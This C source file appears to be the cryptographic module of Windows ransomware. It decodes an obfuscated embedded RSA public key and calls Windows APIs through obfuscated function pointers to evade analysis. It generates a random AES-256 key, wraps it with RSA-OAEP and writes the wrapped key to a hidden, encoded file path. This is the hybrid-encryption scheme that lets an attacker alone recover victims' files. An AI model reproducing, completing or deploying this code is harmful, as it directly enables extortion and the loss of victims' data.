#include "crypto.h"
#include "api.h"
#include "obfuscate.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

BCRYPT_ALG_HANDLE  hRsaAlg = NULL;
BCRYPT_KEY_HANDLE  hPubKey = NULL;
BCRYPT_ALG_HANDLE  hAesAlg = NULL;
BCRYPT_KEY_HANDLE  hAesKey = NULL;
BYTE               aes_key[32];
BYTE               aes_iv[16];

BOOL crypto_init(void) {
    char pub_pem[2048];
    decodeString(s_pub_pem, s_pub_pem_len, pub_pem);

    DWORD der_len = 0;
    if (!pCryptStringToBinaryA(pub_pem, 0, CRYPT_STRING_BASE64, NULL, &der_len, NULL, NULL)) {
        return FALSE;
    }
    BYTE *der = (BYTE*)malloc(der_len);
    if (!pCryptStringToBinaryA(pub_pem, 0, CRYPT_STRING_BASE64, der, &der_len, NULL, NULL)) {
        free(der);
        return FALSE;
    }

    CERT_PUBLIC_KEY_INFO *pInfo = NULL;
    DWORD info_len = 0;
    if (!pCryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, der, der_len, CRYPT_DECODE_ALLOC_FLAG, NULL, &pInfo, &info_len)) {
        free(der);
        return FALSE;
    }
    free(der);

    BYTE *spki = pInfo->PublicKey.pbData;
    if (spki[0] == 0x00) spki++;

    DWORD off = 0;
    DWORD seq_len = spki[off++];
    if (seq_len & 0x80) { int n = seq_len & 0x7F; off += n; }

    DWORD mod_len = spki[off++];
    if (mod_len & 0x80) {
        int n = mod_len & 0x7F;
        mod_len = 0;
        for (int i = 0; i < n; i++) mod_len = (mod_len << 8) | spki[off++];
    }
    BYTE *mod = spki + off;
    if (mod[0] == 0x00) { mod++; mod_len--; }
    off += mod_len + 1;

    DWORD exp_len = spki[off++];
    if (exp_len & 0x80) {
        int n = exp_len & 0x7F;
        exp_len = 0;
        for (int i = 0; i < n; i++) exp_len = (exp_len << 8) | spki[off++];
    }
    BYTE *exp = spki + off;


    DWORD blob_len = sizeof(BCRYPT_RSAKEY_BLOB) + exp_len + mod_len;
    PBYTE blob = (PBYTE)malloc(blob_len);
    BCRYPT_RSAKEY_BLOB *hdr = (BCRYPT_RSAKEY_BLOB*)blob;
    hdr->Magic = BCRYPT_RSAPUBLIC_MAGIC;
    hdr->BitLength = mod_len * 8;
    hdr->cbPublicExp = exp_len;
    hdr->cbModulus = mod_len;
    hdr->cbPrime1 = 0;
    hdr->cbPrime2 = 0;
    memcpy(blob + sizeof(BCRYPT_RSAKEY_BLOB), exp, exp_len);
    memcpy(blob + sizeof(BCRYPT_RSAKEY_BLOB) + exp_len, mod, mod_len);

    pBCryptOpenAlgorithmProvider(&hRsaAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    NTSTATUS st = pBCryptImportKeyPair(hRsaAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hPubKey, blob, blob_len, 0);

    free(blob);
    pLocalFree(pInfo);
    return st == 0;
}

BOOL generate_aes_key(void) {
    NTSTATUS st = pBCryptGenRandom(NULL, aes_key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);


    BYTE rsa_out[256];
    ULONG rsa_out_len = 0;
    BCRYPT_OAEP_PADDING_INFO oaep = { 0 };
    oaep.pszAlgId = BCRYPT_SHA256_ALGORITHM;
    st = pBCryptEncrypt(hPubKey, aes_key, 32, &oaep, NULL, 0, rsa_out, 256, &rsa_out_len, BCRYPT_PAD_OAEP);
    if (st != 0) return FALSE;

    char path_key[512];
    decodeString(s_path_key, s_path_key_len, path_key);

    HANDLE hKey = pCreateFileA(path_key, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written = 0;
    pWriteFile(hKey, rsa_out, rsa_out_len, &written, NULL);
    pCloseHandle(hKey);
    return TRUE;
}

BOOL aes_init(void) {
    NTSTATUS st = pBCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    st = pBCryptGenerateSymmetricKey(hAesAlg, &hAesKey, NULL, 0, aes_key, 32, 0);
    return st == 0;
}

void cleanup_crypto(void) {
    if (hAesKey) pBCryptDestroyKey(hAesKey);
    if (hAesAlg) pBCryptCloseAlgorithmProvider(hAesAlg, 0);
    if (hPubKey) pBCryptDestroyKey(hPubKey);
    if (hRsaAlg) pBCryptCloseAlgorithmProvider(hRsaAlg, 0);
}